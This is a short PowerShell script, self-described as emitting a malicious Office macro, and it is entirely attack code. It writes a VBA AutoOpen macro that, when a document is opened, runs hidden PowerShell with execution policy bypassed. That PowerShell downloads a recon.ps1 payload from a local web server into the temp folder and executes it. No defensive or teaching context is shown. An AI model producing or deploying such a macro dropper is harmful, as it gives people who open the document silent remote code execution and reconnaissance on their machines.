# Macro Emitter - Spits malicious Office macro to drop recon.ps1
$macro = '
Sub AutoOpen()
    Dim obj As Object
    Set obj = CreateObject("Wscript.Shell")
    obj.Run "powershell -ExecutionPolicy Bypass -windowstyle hidden -command ""Invoke-WebRequest -Uri http://127.0.0.1:8000/recon.ps1 -OutFile $env:TEMP\\x.ps1; Start-Process $env:TEMP\\x.ps1"""
End Sub'
Set-Content "$env:USERPROFILE\\Documents\\macro.vba" $macro
